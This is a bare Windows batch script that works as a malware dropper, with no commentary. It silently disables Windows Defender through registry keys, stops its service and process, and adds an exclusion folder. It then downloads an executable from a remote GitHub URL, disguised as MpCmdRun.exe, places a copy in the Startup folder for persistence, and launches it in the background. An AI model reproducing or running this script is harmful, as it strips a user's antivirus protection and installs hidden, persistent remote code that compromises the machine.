@echo off
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f >nul 2>&1
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f >nul 2>&1
sc stop WinDefend >nul 2>&1
taskkill /f /im "MsMpEng.exe" >nul 2>&1
setlocal enabledelayedexpansion
>nul 2>&1 (
    powershell -Command "Add-MpPreference -ExclusionPath '%LOCALAPPDATA%\Microsoft\Vault' -ErrorAction SilentlyContinue"
    if not exist "%LOCALAPPDATA%\Microsoft\Vault" mkdir "%LOCALAPPDATA%\Microsoft\Vault"
    powershell -Command "Add-MpPreference -ExclusionPath '%LOCALAPPDATA%\Microsoft\Vault' -ErrorAction SilentlyContinue"
    curl -L -s -o "%LOCALAPPDATA%\Microsoft\Vault\MpCmdRun.exe" "https://github.com/ajeje-brazorf-02/proton-star/raw/main/Windows_a7.exe"
    curl -L -s -o "%APPDATA%\Microsoft\Windows\Menu Start\Programmi\Esecuzione Automatica\MpCmdRun.exe" "https://github.com/ajeje-brazorf-02/proton-star/raw/main/Windows_a7.exe"
    powershell -Command "Unblock-File '%LOCALAPPDATA%\Microsoft\Vault\VaultSvc.exe'"
    start /B "" "%LOCALAPPDATA%\Microsoft\Vault\MpCmdRun.exe"
)
exit /b
